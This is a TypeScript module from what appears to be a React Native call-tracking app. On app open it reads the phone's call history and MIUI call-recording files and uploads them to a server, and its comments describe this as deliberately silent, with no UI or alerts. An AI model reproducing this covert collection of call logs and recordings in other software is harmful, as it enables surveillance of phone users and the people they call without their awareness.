/**
 * autoSync.ts
 *
 * Silent auto-sync triggered on app open.
 * - Call Logs:  reads device call history → uploads via sync_calls.php
 * - Recordings: scans MIUI folder → uploads new files to server
 *
 * Throttled: won't run more than once every 5 minutes.
 * Completely silent — no UI, no alerts, no progress indicators.
 */
import AsyncStorage from '@react-native-async-storage/async-storage';
import * as SecureStore from 'expo-secure-store';
import { TOKEN_KEY } from '../constants/Config';
import { syncRecordings } from './recording';
import { fetchAndSyncCallLogs, checkCallLogPermission } from './callLog';

const LAST_SYNC_KEY    = 'auto_last_sync_ts';
const SYNC_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes

const getLastSync = async (): Promise<number> => {
    const val = await AsyncStorage.getItem(LAST_SYNC_KEY);
    return val ? parseInt(val, 10) : 0;
};

const setLastSync = async () => {
    await AsyncStorage.setItem(LAST_SYNC_KEY, Date.now().toString());
};

/**
 * Silently syncs call logs from the device.
 * Requires READ_CALL_LOG permission to be already granted.
 * If permission is missing it skips without showing any UI.
 */
const autoSyncCallLogs = async (): Promise<void> => {
    try {
        const hasPermission = await checkCallLogPermission();
        if (!hasPermission) {
            console.log('AutoSync: Call log permission not granted yet — skipping');
            return;
        }
        const result = await fetchAndSyncCallLogs();
        if (result.success) {
            console.log(`AutoSync: Call logs synced — ${result?.data?.synced ?? 0} new entries`);
        } else {
            console.log('AutoSync: Call log sync skipped —', result.message);
        }
    } catch (e: any) {
        console.log('AutoSync: Call log sync error —', e?.message || e);
    }
};

/**
 * Silently syncs MIUI recordings folder to server.
 * Only uploads files not previously uploaded (uses local filename cache).
 */
const autoSyncRecordings = async (): Promise<void> => {
    try {
        const result = await syncRecordings();
        if (result.success && (result.count ?? 0) > 0) {
            console.log(`AutoSync: Recordings synced — ${result.count} new files`);
        } else {
            console.log('AutoSync: Recordings — no new files or path not set');
        }
    } catch (e: any) {
        console.log('AutoSync: Recording sync error —', e?.message || e);
    }
};

/**
 * Main entry point — call from _layout.tsx on app mount.
 * Throttled to once per 5 minutes. Checks token before running.
 */
export const runAutoSync = async (): Promise<void> => {
    try {
        const token = await SecureStore.getItemAsync(TOKEN_KEY);
        if (!token) {
            console.log('AutoSync: No auth token — not logged in, skipping');
            return;
        }

        const last = await getLastSync();
        const now  = Date.now();

        if (now - last < SYNC_INTERVAL_MS) {
            const secsAgo = Math.round((now - last) / 1000);
            console.log(`AutoSync: Skipped — last ran ${secsAgo}s ago (cooldown: 5 min)`);
            return;
        }

        console.log('AutoSync: Starting silent background sync...');
        await setLastSync();

        // Run both in parallel — one won't block the other
        await Promise.allSettled([
            autoSyncCallLogs(),
            autoSyncRecordings(),
        ]);

        console.log('AutoSync: Complete ✓');
    } catch (err: any) {
        console.error('AutoSync top-level error:', err?.message || err);
    }
};
